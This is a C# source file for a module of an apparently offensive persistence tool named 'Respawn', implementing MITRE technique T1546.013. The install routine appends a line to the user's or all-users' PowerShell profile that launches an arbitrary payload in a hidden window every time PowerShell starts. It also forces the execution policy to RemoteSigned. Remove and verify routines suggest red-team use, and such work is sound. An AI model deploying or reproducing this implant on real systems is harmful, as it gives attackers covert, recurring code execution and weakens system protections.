using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using System.Diagnostics;

namespace Respawn.Techniques.PowerShellProfile
{
    public class PowerShellProfileModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "ps";
        public string Name        => "PowerShell Profile";
        public string Mitre       => "T1546.013";
        public string Description => "Persist by appending a malicious command to the PowerShell profile.ps1 script, ensuring the payload automatically executes in the background whenever a new PowerShell console or session is initialized.";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "keys");

            // 2. EXECUTION CONTEXT
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  EXECUTION CONTEXT:");
            // Console.ResetColor();
            // Console.WriteLine("    - 'current-user' profiles do not require Admin rights");
            // Console.WriteLine("    - 'all-users' profiles require Administrative privileges");
            // Console.WriteLine("    - Triggers on both Console and ISE launches");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-k,  --key", "Profile ID (current-user, all-users)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Command to execute (exe, script, or built-in tool)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t ps -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t ps -a install -k current-user -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t ps -a verify  -k current-user -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t ps -a remove  -k current-user -p \"C:\\p.exe\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return PowerShellProfileKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = PowerShellProfileKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                string profilePath = ResolvePath(ctx.Key);
                string profileDir  = Path.GetDirectoryName(profilePath)!;

                // create profile directory if it doesn't exist
                if (!Directory.Exists(profileDir))
                    Directory.CreateDirectory(profileDir);

                // check if payload already present
                if (System.IO.File.Exists(profilePath))
                {
                    string existing = System.IO.File.ReadAllText(profilePath);
                    if (existing.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                        return TechniqueResult.Exists($"Payload already present in profile '{profilePath}'.");
                }

                // set execution policy to allow local scripts
                RunPowerShell("Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force");

                // append payload as a Start-Process call — runs silently in background
                string line = $"\r\nStart-Process -FilePath \"{ctx.Payload}\" -WindowStyle Hidden";
                System.IO.File.AppendAllText(profilePath, line);

                return TechniqueResult.Ok(
                    $"Installed payload in PowerShell profile '{profilePath}' | " +
                    $"Execution policy set to RemoteSigned | " +
                    $"Fires every time PowerShell starts.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Use -k all-users requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = PowerShellProfileKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                string profilePath = ResolvePath(ctx.Key);

                if (!System.IO.File.Exists(profilePath))
                    return TechniqueResult.NotFound($"Profile not found: '{profilePath}'.");

                string content = System.IO.File.ReadAllText(profilePath);

                if (!content.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"Payload not found in profile '{profilePath}'.");

                // remove the line containing our payload
                string line    = $"\r\nStart-Process -FilePath \"{ctx.Payload}\" -WindowStyle Hidden";
                string updated = content.Replace(line, string.Empty, StringComparison.OrdinalIgnoreCase);
                System.IO.File.WriteAllText(profilePath, updated);

                if (string.IsNullOrWhiteSpace(updated))
                    System.IO.File.Delete(profilePath);

                // restore execution policy
                RunPowerShell("Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser -Force");

                return TechniqueResult.Ok(
                    $"Removed payload from PowerShell profile '{profilePath}' | " +
                    $"Execution policy restored to Restricted.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = PowerShellProfileKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys to see available keys.");

            try
            {
                string profilePath = ResolvePath(ctx.Key);

                if (!System.IO.File.Exists(profilePath))
                    return TechniqueResult.NotFound($"Profile not found: '{profilePath}'.");

                string content = System.IO.File.ReadAllText(profilePath);

                if (!content.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"Payload not found in profile '{profilePath}'.");

                // check execution policy
                string policy = RunPowerShellCapture("(Get-ExecutionPolicy -Scope CurrentUser).ToString()");

                return TechniqueResult.Ok(
                    $"Verified payload in PowerShell profile '{profilePath}' | " +
                    $"Execution policy: {policy.Trim()}");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. Try running as administrator.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private void RunPowerShell(string command)
        {
            var psi = new ProcessStartInfo("powershell.exe")
            {
                Arguments              = $"-Command \"{command}\"",
                UseShellExecute        = false,
                CreateNoWindow         = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true
            };
            using var p = Process.Start(psi);
            p?.WaitForExit();
        }

        private string RunPowerShellCapture(string command)
        {
            var psi = new ProcessStartInfo("powershell.exe")
            {
                Arguments              = $"-Command \"{command}\"",
                UseShellExecute        = false,
                CreateNoWindow         = true,
                RedirectStandardOutput = true,
                RedirectStandardError  = true
            };
            using var p = Process.Start(psi);
            string output = p?.StandardOutput.ReadToEnd() ?? string.Empty;
            p?.WaitForExit();
            return output;
        }

        private string ResolvePath(string keyId)
        {
            if (keyId.Equals("current-user", StringComparison.OrdinalIgnoreCase))
            {
                string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                return Path.Combine(docs, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1");
            }
            else
            {
                string pf = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                return Path.Combine(pf, "PowerShell", "7", "profile.ps1");
            }
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Key))
            {
                error = "No key specified. Use -k <key-id> or see -a list-keys.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}